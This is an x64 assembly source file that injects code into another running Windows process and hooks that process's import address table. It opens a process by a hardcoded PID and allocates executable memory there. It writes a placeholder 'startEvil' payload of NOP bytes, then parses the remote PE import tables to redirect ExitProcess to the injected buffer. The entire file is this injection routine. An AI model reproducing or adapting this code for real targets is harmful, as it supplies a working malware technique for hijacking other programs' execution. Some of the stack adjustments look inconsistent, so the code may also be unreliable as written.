; windows_injection_iathooking.asm

extrn GetLastError :PROC
extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn VirtualProtect :PROC
extrn NtQueryInformationProcess :PROC
extrn ReadProcessMemory :PROC
extrn VirtualProtectEx :PROC

_PROCESS_BASIC_INFORMATION STRUCT
    ExitStatus                      DQ ?
    PebBaseAddress                  DQ ?
    AffinityMask                    DQ ?
    BasePriority                    DQ ?
    UniqueProcessID                 DQ ?
    InheritedFromUniqueProcessId    DQ ?
_PROCESS_BASIC_INFORMATION ENDS

_IMAGE_DIRECTORY_TABLE STRUCT
    ImportLookupTableRVA            DD ?
    TimeDateStamp                   DD ?
    ForwarderChain                  DD ?
    NameRVA                         DD ?
    ImportAddressTableRVA        DD ?
_IMAGE_DIRECTORY_TABLE ENDS

_HINT_NAME_TABLE STRUCT
    Hint            DB 2 DUP (?)
    functionName    DB 64 DUP (0)
_HINT_NAME_TABLE ENDS

_IMPORT_LOOKUP_TABLE STRUCT
    OFT_RVA         DQ ?
_IMPORT_LOOKUP_TABLE ENDS

.data
    PID                     DQ 5212
    memAlloc                DQ ?
    startEvil               DB 90h, 90h, 90h, 90h, 90h, 90h
    endEvil                 DB 0
    sizeEvil                DQ ?
    hProcess                DQ ?
    align                   16
    pbi                     _PROCESS_BASIC_INFORMATION <>
    pbi_size                DQ ?
    imageBase               DQ ?
    e_lfanew                DD ?
    importDirectory         DD ?
    importDirectoryTable    _IMAGE_DIRECTORY_TABLE <>
    importLookupTable       _IMPORT_LOOKUP_TABLE <>
    hintNameTable           _HINT_NAME_TABLE <>
    IDT_counter             DD ?
    ILT_counter             DD ?
    function_counter        DD ?
    function2hook           DB "ExitProcess", 0
    len_function2hook       DQ 12
    function2hookaddr       DQ ?
    oldProtect              DQ ?

.code
Start PROC
    SUB     rsp, 28h

_OpenProcess:
    MOV     rcx, 1FFFFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JE      _exit
    MOV     hProcess, rax

_calculateSizeEvil:
    LEA     rax, startEvil
    LEA     rbx, endEvil
    SUB     rbx, rax
    MOV     sizeEvil, rbx

_VirtualAllocEx:
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, sizeEvil
    MOV     r9, 3000h
    SUB     rsp, 28h
    MOV     qword ptr [rsp+20h], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    MOV     memAlloc, rax
    ADD     rsp, 8     

_WriteProcessMemory:
    MOV     rcx, hProcess
    MOV     rdx, memAlloc
    LEA     r8, startEvil
    MOV     r9, sizeEvil
    SUb     rsp, 28h
    XOR     rax, rax
    MOV     [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

_NtQueryInformationProcess:
    MOV     rcx, hProcess
    XOR     rdx, rdx
    LEA     r8, pbi
    MOV     r9, SIZEOF pbi
    SUB     rsp, 28h
    LEA     rax, pbi_size
    MOV     [rsp+32], rax
    CALL    NtQueryInformationProcess
    CMP     rax, 0
    JNE     _exit
    ADD     rsp, 28h

_getImageBaseAddress:
    MOV     rcx, hProcess
    MOV     rdx, pbi.PebBaseAddress
    ADD     rdx, 10h
    LEA     r8, [imageBase]
    MOV     r9, SIZEOF imageBase
    SUB     rsp, 28h
    XOR     r10, r10
    MOV     [rsp+20h], r10
    CALL    ReadProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JE      _exit

_getElfanewValue:
    MOV     rcx, hProcess
    MOV     rdx, imageBase
    ADD     rdx, 3Ch
    LEA     r8, e_lfanew
    MOV     r9, SIZEOF e_lfanew
    SUB     rsp, 28h
    XOR     r10, r10
    MOV     [rsp+20h], r10
    CALL    ReadProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JE      _exit

_getImportDirectoryValue:
    MOV     rcx, hProcess
    XOR     rax, rax
    MOV     eax, e_lfanew
    ADD     eax, 90h
    MOV     rdx, imageBase
    ADD     rdx, rax
    LEA     r8, importDirectory
    MOV     r9, SIZEOF importDirectory
    SUB     rsp, 28h
    XOR     r10, r10
    MOV     [rsp+20h], r10
    CALL    ReadProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JE      _exit

    XOR     r12, r12
    MOV     IDT_counter, r12d

_loopThroughIDT:
    MOV     rcx, hProcess
    XOR     rax, rax
    ADD     eax, importDirectory
    ADD     eax, IDT_counter
    MOV     rdx, imageBase
    ADD     rdx, rax
    LEA     r8, importDirectoryTable
    MOV     r9, SIZEOF importDirectoryTable
    SUB     rsp, 28h
    XOR     r10, r10
    MOV     [rsp+20h], r10
    CALL    ReadProcessMemory
    ADD     rsp, 28h

    XOR     r12, r12
    MOV     ILT_counter, r12d
    MOV     function_counter, r12d
    
    _loopThroughILT:
        MOV     rcx, hProcess
        XOR     rax, rax
        ADD     eax, importDirectoryTable.ImportLookupTableRVA
        ADD     eax, ILT_counter
        MOV     rdx, imageBase
        ADD     rdx, rax
        LEA     r8, importLookupTable
        MOV     r9, SIZEOF importLookupTable
        SUB     rsp, 28h
        XOR     r10, r10
        MOV     [rsp+20h], r10
        CALL    ReadProcessMemory
        ADD     rsp, 28h

        CMP     importLookupTable.OFT_RVA, 0
        JZ      _loopThroughILT_end

        ; hintNameTable
        MOV     rcx, hProcess
        XOR     rax, rax
        MOV     rbx, importLookupTable.OFT_RVA
        ADD     eax, ebx
        MOV     rdx, imageBase
        ADD     rdx, rax
        LEA     r8, hintNameTable
        MOV     r9, SIZEOF hintNameTable
        SUB     rsp, 28h
        XOR     r10, r10
        MOV     [rsp+20h], r10
        CALL    ReadProcessMemory
        ADD     rsp, 28h

        ; compare string
        LEA     rsi, hintNameTable.functionName
        LEA     rdi, function2hook
        MOV     rcx, len_function2hook
        REPE CMPSB
        JB      _loopThroughILT_next
        JA      _loopThroughILT_next
        MOV     rcx, hProcess
        XOR     rdx, rdx
        MOV     edx, importDirectoryTable.ImportAddressTableRVA
        ADD     edx, function_counter
        ADD     rdx, imageBase
        LEA     r8, function2hookaddr
        MOV     r9, SIZEOF function2hookaddr
        SUB     rsp, 28h
        XOR     r10, r10
        MOV     [rsp+20h], r10
        CALL    ReadProcessMemory
        ADD     rsp, 28h

        MOV     rcx, hProcess
        XOR     rdx, rdx
        MOV     edx, importDirectoryTable.ImportAddressTableRVA
        ADD     edx, function_counter
        ADD     rdx, imageBase
        MOV     r8, SIZEOF function2hookaddr
        MOV     r9, 40h
        SUB     rsp, 28h
        LEA     rax, oldProtect
        MOV     [rsp+20h], rax
        CALL    VirtualProtectEx
        ADD     rsp, 28h
        CMP     rax, 0
        JZ      _exit

        MOV     rcx, hProcess
        XOR     rdx, rdx
        MOV     edx, importDirectoryTable.ImportAddressTableRVA
        ADD     edx, function_counter
        ADD     rdx, imageBase
        LEA     r8, memAlloc
        MOV     r9, SIZEOF memAlloc
        SUB     rsp, 28h
        XOR     rax, rax
        MOV     [rsp+32], rax
        CALL    WriteProcessMemory
        ADD     rsp, 28h
        CMP     rax, 0
        JZ      _exit
    _loopThroughILT_next:
        ADD     ILT_counter, SIZEOF importLookupTable
        ADD     function_counter, SIZEOF importLookupTable
        JMP     _loopThroughILT
    
    _loopThroughILT_end:
    
    CMP     importDirectoryTable.ImportLookupTableRVA, 0
    JZ      IDT_next_1
    JMP     _loopThroughIDT_next

IDT_next_1:
    CMP     importDirectoryTable.TimeDateStamp, 0
    JZ      IDT_next_2
    JMP     _loopThroughIDT_next
IDT_next_2:
    CMP     importDirectoryTable.ForwarderChain, 0
    JZ      IDT_next_3
    JMP     _loopThroughIDT_next
IDT_next_3:
    CMP     importDirectoryTable.NameRVA, 0
    JZ      IDT_next_4
    JMP     _loopThroughIDT_next
IDT_next_4:
    CMP     importDirectoryTable.ImportAddressTableRVA, 0
    JZ      _loopThroughIDT_end
    JMP     _loopThroughIDT_next
_loopThroughIDT_next:
    ADD     IDT_counter, SIZEOF importDirectoryTable
    JMP     _loopThroughIDT
_loopThroughIDT_end:

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess

Start ENDP

END